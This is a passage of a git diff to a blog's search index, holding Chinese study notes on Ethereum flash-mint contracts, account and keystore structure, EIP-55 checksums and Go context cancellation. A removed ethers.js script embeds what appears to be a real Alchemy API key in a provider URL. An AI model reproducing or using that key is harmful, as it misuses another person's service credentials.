&#123;</span><br><span class="line">        require(amount &lt;= maxFlashLoan(token), &quot;ERC20FlashMint: amount exceeds maxFlashLoan&quot;);</span><br><span class="line">        uint256 fee = flashFee(token, amount);</span><br><span class="line">        _mint(address(borrower), amount);</span><br><span class="line">        require(</span><br><span class="line">            borrower.onFlashLoan(address(borrower), token, amount, fee, data) == _RETURN_VALUE,</span><br><span class="line">            &quot;ERC20FlashMint: invalid return value&quot;</span><br><span class="line">        );</span><br><span class="line">     </span><br><span class="line">        uint256 currentAllowance = allowance(address(this),address(borrower));</span><br><span class="line">        require(currentAllowance &gt;= amount + fee, &quot;ERC20FlashMint: allowance does not allow refund&quot;);</span><br><span class="line">        _approve(address(this),address(borrower) , currentAllowance - amount - fee);</span><br><span class="line">        // 是否需要烧掉根据实际情况需求而定</span><br><span class="line">        ///_burn(address(receiver), amount + fee);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //贷款方或银行经理approve</span><br><span class="line">    function approveLoanAmount(address borrower ,uint256 amount) public virtual onlyOwner  &#123;</span><br><span class="line">        _approve(address(this),borrower , amount);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Borrower is IERC3156FlashBorrower &#123;</span><br><span class="line">    enum Action &#123;NORMAL, OTHER&#125;</span><br><span class="line">    IERC3156FlashLender lender;</span><br><span class="line">    constructor (address _lenderAddress) &#123;</span><br><span class="line">        lender = IERC3156FlashLender(_lenderAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev ERC-3156 Flash loan callback</span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 fee,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns(bytes32) &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == address(lender),</span><br><span class="line">            &quot;FlashBorrower: Untrusted lender&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            initiator == address(this),</span><br><span class="line">            &quot;FlashBorrower: Untrusted loan initiator&quot;</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        (Action action) = abi.decode(data, (Action));</span><br><span class="line">        console.log(&quot;action&quot;);</span><br><span class="line">        </span><br><span class="line">        if (action == Action.NORMAL) &#123;</span><br><span class="line">            // do one thing</span><br><span class="line">            console.log(&quot;Action.NORMAL&quot;);</span><br><span class="line">        &#125; else if (action == Action.OTHER) &#123;</span><br><span class="line">            console.log(&quot;Action.OTHER&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /// @dev Initiate a flash loa</span><br><span class="line">    function flashBorrow(</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        bytes memory data = abi.encode(Action.NORMAL);</span><br><span class="line">        uint256 _allowance = IERC20(token).allowance(address(lender),address(this));</span><br><span class="line">       </span><br><span class="line">        uint256 _fee = lender.flashFee(token, amount);</span><br><span class="line">        uint256 _repayment = amount + _fee;</span><br><span class="line">        console.log(&quot;_allowance&quot;,_allowance,&quot;_repayment&quot;,_repayment);</span><br><span class="line">        require(_allowance &gt;= _repayment, &quot;ERC20FlashMint: allowance does not allow refund&quot;);</span><br><span class="line">        lender.flashLoan(this, token, amount, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodeNORMAL() public pure returns(bytes memory message)&#123;</span><br><span class="line">        return abi.encode(Action.NORMAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>ETH</tag>
+        <tag>Etherjs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ETH账户</title>
+    <url>/2022/04/05/2-2Account-md/</url>
+    <content><![CDATA[<h2 id="账户内部状态成员"><a href="#账户内部状态成员" class="headerlink" title="账户内部状态成员"></a>账户内部状态成员</h2><p>core/state/snapshot/account.go</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Account struct {</span><br><span class="line">	Nonce    uint64</span><br><span class="line">	Balance  *big.Int</span><br><span class="line">	Root     []byte</span><br><span class="line">	CodeHash []byte</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nonce</td>
+<td>是一个连续递增的序号，在账户每次交易的时候加一次。 用于防止交易重复攻击，同事它可以代表的该账户的交易次数</td>
+</tr>
+<tr>
+<td>balance</td>
+<td>余额</td>
+</tr>
+<tr>
+<td>code</td>
+<td>账户可以执行的代码，编译后的代码（合约专属）</td>
+</tr>
+<tr>
+<td>storage</td>
+<td>合约专属，自身的存储信息，具有永久性</td>
+</tr>
+</tbody></table>
+<h2 id="账户状态构成了以太坊的世界态"><a href="#账户状态构成了以太坊的世界态" class="headerlink" title="账户状态构成了以太坊的世界态"></a>账户状态构成了以太坊的世界态</h2><p><img src="/images/web3/6.png" alt="image"></p>
+<ul>
+<li>改变账户存储数据，就会改变storageRoot，就会改变以太坊世界态</li>
+<li></li>
+</ul>
+<h2 id="以太坊账户的两种类型"><a href="#以太坊账户的两种类型" class="headerlink" title="以太坊账户的两种类型"></a>以太坊账户的两种类型</h2><h3 id="外部账户-EOA"><a href="#外部账户-EOA" class="headerlink" title="外部账户  EOA"></a>外部账户  EOA</h3><h3 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h3><ul>
+<li><p>多重签名 </p>
+<blockquote>
+<p>创建一个合约，必须多个人同意 。</p>
+</blockquote>
+</li>
+<li><p>检查是否是合约地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.6 &lt;0.7;</span><br><span class="line"></span><br><span class="line">contract CheckAddrType{</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) public view returns(bool){</span><br><span class="line">        uint256 len;</span><br><span class="line">        assembly{</span><br><span class="line">            len :=extcodesize(_addr)</span><br><span class="line">        }</span><br><span class="line">        return len&gt;0;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果销毁合约，那么不能检查出合约地址。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.6 &lt;0.7;</span><br><span class="line"></span><br><span class="line">  contract CheckAddrType{</span><br><span class="line"></span><br><span class="line">      function isContract(address _addr) public view returns(bool){</span><br><span class="line">          uint256 len;</span><br><span class="line">          assembly{</span><br><span class="line">              len :=extcodesize(_addr)</span><br><span class="line">          }</span><br><span class="line">          return len&gt;0;</span><br><span class="line">      }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  contract TestContract {</span><br><span class="line"></span><br><span class="line">      function kill() public {</span><br><span class="line">          selfdestruct(msg.sender);</span><br><span class="line">      }</span><br><span class="line">  }</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>通过API获取合约是否是地址</p>
+</li>
+<li><p>通过Ether.js 判断</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">provider.getCode(addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当getCodesize(addr) ==0 ,则该地址不是合约，它是外部账户。</p>
+<blockquote>
+<p>不正确。可能合约注销或者没有部署</p>
+</blockquote>
+<h1 id="KeyStore原理"><a href="#KeyStore原理" class="headerlink" title="KeyStore原理"></a>KeyStore原理</h1><blockquote>
+<p>keystore加密存储账户私钥的。</p>
+</blockquote>
+<h2 id="新建账户"><a href="#新建账户" class="headerlink" title="新建账户"></a>新建账户</h2><p>使用geth新建账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro go % geth account new</span><br><span class="line">INFO [04-06|10:08:12.351] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Password: </span><br><span class="line">Repeat password: </span><br><span class="line"></span><br><span class="line">Your new key was generated</span><br><span class="line"></span><br><span class="line">Public address of the key:   0xc4D5F0B6028feF10f4640Cb8340510b03beE5fDf</span><br><span class="line">Path of the secret key file: /Users/darren/Library/Ethereum/keystore/UTC--2022-04-06T02-08-18.000473000Z--c4d5f0b6028fef10f4640cb8340510b03bee5fdf</span><br><span class="line"></span><br><span class="line">- You can share your public address with anyone. Others need it to interact with you.</span><br><span class="line">- You must NEVER share the secret key with anyone! The key controls access to your funds!</span><br><span class="line">- You must BACKUP your key file! Without the key, it's impossible to access account funds!</span><br><span class="line">- You must REMEMBER your password! Without the password, it's impossible to decrypt the key!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="账户文件存放在哪里-？"><a href="#账户文件存放在哪里-？" class="headerlink" title="账户文件存放在哪里 ？"></a>账户文件存放在哪里 ？</h2><p>不同的平台，存放位置不同。keystore 文件存放在：$DataDir/keystore下。</p>
+<p>这里的路径前部分是表示DataDir,可以参数设定。 如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth account new --datadir ./study </span><br></pre></td></tr></table></figure>
+
+<h2 id="使用keystore的原因："><a href="#使用keystore的原因：" class="headerlink" title="使用keystore的原因："></a>使用keystore的原因：</h2><p>直接把账户私钥单独存储到加密工具中 ===》 危险，你的私钥会暴露。。存储到keystore中。</p>
+<ul>
+<li>安全性：攻击者需要密钥文件和密码来窃取资金 。  </li>
+<li>可用性：仅需要密码库文件和密码来使用资金。</li>
+</ul>
+<h2 id="keystore文件的内容"><a href="#keystore文件的内容" class="headerlink" title="keystore文件的内容"></a>keystore文件的内容</h2><p>该文件是json格式 ，主要记录账户地址，账户私钥的加密描述。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">{</span><br><span class="line">	"address": "3e6ba59effa8d6f3f550287f33b3e6c250c83af0",</span><br><span class="line">	"crypto": {</span><br><span class="line">		"cipher": "aes-128-ctr",</span><br><span class="line">		"ciphertext": "32ec492665525ad07921c52f4d9c81a0c77db4bedfa16a13ce754ff3752eacef",</span><br><span class="line">		"cipherparams": {</span><br><span class="line">			"iv": "93c1f9101258bd2a9e73ddd0ae2b353f"</span><br><span class="line">		},</span><br><span class="line">		"kdf": "scrypt",</span><br><span class="line">		"kdfparams": {</span><br><span class="line">			"dklen": 32,</span><br><span class="line">			"n": 4096,</span><br><span class="line">			"p": 6,</span><br><span class="line">			"r": 8,</span><br><span class="line">			"salt": "f18e41e266f591fcb13b2f717d5fa5f80a9e96014eeada68ec9776bf8ed803ec"</span><br><span class="line">		},</span><br><span class="line">		"mac": "d9f09d2b8dec2b3c1d6e3e6c99931c1d69b75d76a3581711b7ed55eed7e39b9a"</span><br><span class="line">	},</span><br><span class="line">	"id": "2fdf9d36-e97b-40ce-873c-ea5be4071d14",</span><br><span class="line">	"version": 3</span><br><span class="line">}   </span><br></pre></td></tr></table></figure>
+
+<p>·address:该账户的公开地址<br>·crypto:私钥加密描述<br>·id:文件的随机ID<br>·version:keystore协议版本号，最新版本是3。</p>
+<h2 id="keystore工作原理"><a href="#keystore工作原理" class="headerlink" title="keystore工作原理"></a>keystore工作原理</h2><p><img src="/images/web3/keystore.png" alt="image"></p>
+<ul>
+<li>cipher:描述使用何种强对称加密算法，这里是aes-128-ctr。<ul>
+<li>AES：高级加密标准的简称可确保使用标准的加密库可以正<br>常加密和解码内容。</li>
+<li>128：解密密钥的长度，有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container>个，暴利破解几乎不可能。</li>
+<li>CTR：AES算法中的机密模式。</li>
+</ul>
+</li>
+<li>ciphertext:账户私钥密文</li>
+<li>cipherparams-iv:AES算法参数“初始化向量”，</li>
+</ul>
+<p><img src="/images/web3/keystore2.png" alt="image"></p>
+<p>解密密钥从哪里来的？</p>
+<h2 id="用密码保护解密密钥"><a href="#用密码保护解密密钥" class="headerlink" title="用密码保护解密密钥"></a>用密码保护解密密钥</h2><ul>
+<li>kdf：密钥派生函数，这里是scrypt。用于计算（或“推导”）密码<br>短语中的解密密钥。</li>
+<li>kdfparams:<ul>
+<li>dklen:解密密钥的长度，32字节。</li>
+<li>n：迭代计算次数。</li>
+<li>p：并行化因子，这里是1，只能串行计算n次。</li>
+<li>r：底层哈希运算的块大小。</li>
+<li>salt：kdf的随机盐</li>
+</ul>
+</li>
+</ul>
+<p>你无需记住用于解密密文的非常长且非用户友好的解密密钥。<br>好处：对解密机密进行扩展，以使其更难于暴力破解。</p>
+<p><img src="/images/web3/keystore3.png" alt="image"></p>
+<p>kpdf.n值越犬，加密级别越高，消耗的内存也越大！</p>
+<h2 id="mac验证"><a href="#mac验证" class="headerlink" title="mac验证"></a>mac验证</h2><ul>
+<li>mac： 校验码，用于检测推导出的解密密钥是否正确。</li>
+</ul>
+<p><img src="/images/web3/keystore4.png" alt="image"></p>
+<h2 id="完整解密私钥"><a href="#完整解密私钥" class="headerlink" title="完整解密私钥"></a>完整解密私钥</h2><p><img src="/images/web3/keystore6.png" alt="image"></p>
+<h1 id="如何检验账户地址的错误输入"><a href="#如何检验账户地址的错误输入" class="headerlink" title="如何检验账户地址的错误输入"></a>如何检验账户地址的错误输入</h1><h2 id="认识checkSum"><a href="#认识checkSum" class="headerlink" title="认识checkSum"></a>认识checkSum</h2><ul>
+<li>它是冗余校验的一种形式。</li>
+<li>它是通过错误检测方法，对经过空间（如通信）或时间（如计算机存储）所传送数据的完整性<br>进行检查的一种简单方法。<br>比如，当我们在一些网站中下载程序时，会同时告知此下载文件的MD5的CheckSum值。</li>
+</ul>
+<p>Md5Checker: <a class="link" href="http://getmd5checker.com/">http://getmd5checker.com/<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li>应用场景 ： <ul>
+<li>下载，与其他地方的下载文件同官方文件进行比较</li>
+<li>备份</li>
+</ul>
+</li>
+</ul>
+<h2 id="EIP-55-Mixed-case-checksum-address-encoding-提案"><a href="#EIP-55-Mixed-case-checksum-address-encoding-提案" class="headerlink" title="EIP-55:Mixed-case checksum address encoding 提案"></a>EIP-55:Mixed-case checksum address encoding 提案</h2><p>EIP-55规定：在将账户地址转换为十六进制字符时，<br>当十六进制地址的第i位是字母（即abcdef之一）时：<br>如果小写的十六进制地址的哈希值的第i*4位比特为1，则大写形式打印，否则小写形式<br>打印。<br>你要明白：<br>1.在十六进制中大写和小写的字母，都能代表相同的字节。<br>2.大小不同字母的哈希结果完全不一致。</p>
+]]></content>
+      <categories>
+        <category>Web3</category>
+      </categories>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2-4ETH_DappUniversity</title>
+    <url>/2021/04/30/2-5ETH-DappUniversity/</url>
+    <content><![CDATA[<h1 id="NFT-masterclass-1"><a href="#NFT-masterclass-1" class="headerlink" title="NFT masterclass 1"></a>NFT masterclass 1</h1><p><img src="/images/web3/nft1.png" alt="images"></p>
+<h1 id="The-DeFi-Masterclass-Replays"><a href="#The-DeFi-Masterclass-Replays" class="headerlink" title="The DeFi Masterclass Replays"></a>The DeFi Masterclass Replays</h1>]]></content>
+      <tags>
+        <tag>ETH</tag>
+        <tag>NFT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>3-1Go-advance</title>
+    <url>/2020/05/25/3-1Go-advance/</url>
+    <content><![CDATA[<h1 id="Context初识"><a href="#Context初识" class="headerlink" title="Context初识"></a>Context初识</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;sync&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line">var notify bool</span><br><span class="line"></span><br><span class="line">//为什么需要context</span><br><span class="line"></span><br><span class="line">func f() &#123;</span><br><span class="line"></span><br><span class="line">	defer wg.Done()</span><br><span class="line"></span><br><span class="line">	for &#123;</span><br><span class="line">		fmt.Println(&quot;hi&quot;)</span><br><span class="line">		time.Sleep(time.Second * 1)</span><br><span class="line">		if notify &#123;</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	wg.Add(1)</span><br><span class="line">	go f()</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Second * 5)</span><br><span class="line">	notify = true</span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	// 如何通知子goroutine 退出</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>如何优雅的控制子goroutine退出 ？</p>
+<p>Context版本的 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;sync&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line">var exitChan = make(chan bool, 1)</span><br><span class="line"></span><br><span class="line">//为什么需要context</span><br><span class="line"></span><br><span class="line">func f(ctx context.Context) &#123;</span><br><span class="line"></span><br><span class="line">	defer wg.Done()</span><br><span class="line">LOOP:</span><br><span class="line">	for &#123;</span><br><span class="line">		fmt.Println(&quot;hi&quot;)</span><br><span class="line">		time.Sleep(time.Second * 1)</span><br><span class="line">		select &#123;</span><br><span class="line">		case &lt;-ctx.Done():</span><br><span class="line">			break LOOP</span><br><span class="line">		default:</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">	// 初始化channel</span><br><span class="line">	ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line">	wg.Add(1)</span><br><span class="line">	go f(ctx)</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Second * 5)</span><br><span class="line"></span><br><span class="line">	// 通知</span><br><span class="line">	cancel()</span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	// 如何通知子goroutine 退出</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="消息队列通信模型"><a href="#消息队列通信模型" class="headerlink" title="消息队列通信模型"></a>消息队列通信模型</h1><h2 id="点对点模式queue"><a href="#点对点模式queue" class="headerlink" title="点对点模式queue"></a>点对点模式queue</h2><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2>]]></content>
+      <tags>
+        <tag>Golang</tag>
       </tags>
   </entry>
   <entry>
@@ -517,200 +794,6 @@ eth.getTransaction(xxx)
 ]]></content>
       <tags>
         <tag>ETH</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2-1ETH_Crypto</title>
-    <url>/2021/05/03/2-1ETH-Crypto/</url>
-    <content><![CDATA[<h1 id="数据签名算法"><a href="#数据签名算法" class="headerlink" title="数据签名算法"></a>数据签名算法</h1><h2 id="ECDSA数字签名算法"><a href="#ECDSA数字签名算法" class="headerlink" title="ECDSA数字签名算法"></a>ECDSA数字签名算法</h2><ul>
-<li>椭圆曲线签名算法。</li>
-</ul>
-<h2 id="secp256k1签名算法"><a href="#secp256k1签名算法" class="headerlink" title="secp256k1签名算法"></a>secp256k1签名算法</h2><p>高效密码组标准（SECG）协会开发，比特币使用了此算法，从此secp256k1开始流行。</p>
-<p>sec 标识来自SECG标准<br>p 标识曲线坐标的素数域<br>256表示素数是256位长<br>k表示koblitz曲线变体<br>1表示第一个标准的此类型曲线</p>
-<ul>
-<li>优点 <ul>
-<li>1.占用很少的宽带和</li>
-<li>2.存储资源，密钥长度很短。</li>
-<li>3.让所有的用户都可以使用同样的操作完成域运算。</li>
-<li>4.由于其特殊构造的特殊性，其优化后实现比其他曲线性能上可以提高30%</li>
-</ul>
-</li>
-</ul>
-<h2 id="为什么比特币选择secp256k1签名算法而不是其他已流行的算法？"><a href="#为什么比特币选择secp256k1签名算法而不是其他已流行的算法？" class="headerlink" title="为什么比特币选择secp256k1签名算法而不是其他已流行的算法？"></a>为什么比特币选择secp256k1签名算法而不是其他已流行的算法？</h2><p>安全： 不受任何政府控制，没有后门的签名算法。<br>高效：可预测性，高效。</p>
-<h2 id="以太坊的签名算法是-secp256k1"><a href="#以太坊的签名算法是-secp256k1" class="headerlink" title="以太坊的签名算法是 secp256k1"></a>以太坊的签名算法是 secp256k1</h2><h1 id="了解椭圆曲线理论基础。"><a href="#了解椭圆曲线理论基础。" class="headerlink" title="了解椭圆曲线理论基础。"></a>了解椭圆曲线理论基础。</h1><h2 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h2><ul>
-<li>就是一个二元三次方程上的所有的点的集合。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>ETH</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2-3ETH_EVM</title>
-    <url>/2022/06/25/2-3ETH-EVM/</url>
-    <content><![CDATA[<h1 id="EVM"><a href="#EVM" class="headerlink" title="EVM"></a>EVM</h1><p><img src="/images/web3/evm1.png" alt="image"></p>
-<p><a class="link"   href="https://www.evm.codes/" >evm.codes<i class="fas fa-external-link-alt"></i></a>  </p>
-<p>汇编操作花费的gas费 </p>
-<p>智能合约编译出xx.json<br>里面有object，opcodes<br>60 push1</p>
-<p>608060<br>6000f3fe</p>
-<p><img src="/images/web3/evm2.png" alt="image"></p>
-<p>PUSH1 0X80<br>PUSH1 0X40<br>MSTORE </p>
-<p>初始化内存</p>
-<h1 id="Ethers如何获取链上数据"><a href="#Ethers如何获取链上数据" class="headerlink" title="Ethers如何获取链上数据?"></a>Ethers如何获取链上数据?</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g typescript</span><br><span class="line"></span><br><span class="line">npm install -g ts-node</span><br></pre></td></tr></table></figure>
-
-<p><a class="link"   href="https://emn178.github.io/online-tools/keccak_256.html" >https://emn178.github.io/online-tools/keccak_256.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><img src="/images/web3/keccak1.png" alt="images"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;ethers&#125; from &#x27;ethers&#x27;</span><br><span class="line"></span><br><span class="line">async function main()&#123;</span><br><span class="line">   const provider = new ethers.providers.WebSocketProvider(&quot;wss://eth-rinkeby.alchemyapi.io/v2/wlSefEw7ZYKLXkmSNDM82KQRWxyI9pPV&quot;)</span><br><span class="line">   </span><br><span class="line">   provider.on(&quot;block&quot;,async(block)=&gt;&#123;</span><br><span class="line">  </span><br><span class="line">    // 获取一个合约的</span><br><span class="line">    let contractAddress = &quot;0x1526651967fec009D5E61385D65bA30B88631422&quot;</span><br><span class="line"></span><br><span class="line">    let topic  =ethers.utils.id(&quot;IdoInvitation(address,address)&quot;)</span><br><span class="line">    console.log(topic)</span><br><span class="line">    </span><br><span class="line">    let filter=&#123;</span><br><span class="line">        fromBlock:10919300,</span><br><span class="line">        address : contractAddress,</span><br><span class="line">        topics : [topic]</span><br><span class="line">    &#125;</span><br><span class="line">    //0xfc9790fbc3d9f4784441e9793c41a7ed13f83b0486c728dcc9ca344db464bb30</span><br><span class="line">    provider.getLogs(filter).then(result=&gt;&#123;</span><br><span class="line">      console.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 主动拉取数据 </span><br><span class="line">    // latest 最新的区块</span><br><span class="line">    // ealiest 最早的区块</span><br><span class="line">    // pending 正在打包的区块</span><br><span class="line">    // 往后数10个区块</span><br><span class="line">    // 10888844</span><br><span class="line">    // provider.getBlock(-10).then(result=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 监听 </span><br><span class="line">    // provider.on(filter,async(result)=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // let filter = &#123;</span><br><span class="line">    //     address : contractAddress</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    // 监听事件</span><br><span class="line">    // provider.on(filter,async(result)=&gt;&#123;</span><br><span class="line">    //     console.log(result)</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">       // 获取区块编号</span><br><span class="line">    //    console.log(block)</span><br><span class="line">    // 获取block内容</span><br><span class="line">    // const blockInfo = await provider.getBlock(block);</span><br><span class="line">    /*</span><br><span class="line">      hash: &#x27;0x041099c0e022d42bd3720a07f9d917220f962b0130ba7dab08209f62228936b9&#x27;,</span><br><span class="line">  parentHash: &#x27;0x8de446faab4cf3c747a7f724005749d80cb7ceacd56dc78ae407d92740ebeb9f&#x27;,</span><br><span class="line">    */</span><br><span class="line">    // console.log(blockInfo)</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">    // 获取block内容以及交易数据 </span><br><span class="line"></span><br><span class="line">    // const blockWithTransactions =await provider.getBlockWithTransactions(block)</span><br><span class="line">    // console.log(blockWithTransactions)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &#125;)</span><br><span class="line"></span><br><span class="line">//    provider.on(&quot;pending&quot;,async(tx)=&gt;&#123;</span><br><span class="line">//        console.log(tx)</span><br><span class="line">//       // 交易</span><br><span class="line">//        const txDetail  = await provider.getTransaction(tx);</span><br><span class="line">//        console.log(txDetail);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">//    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>ETH</tag>
-        <tag>EVM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ETH账户</title>
-    <url>/2022/04/05/2-2Account-md/</url>
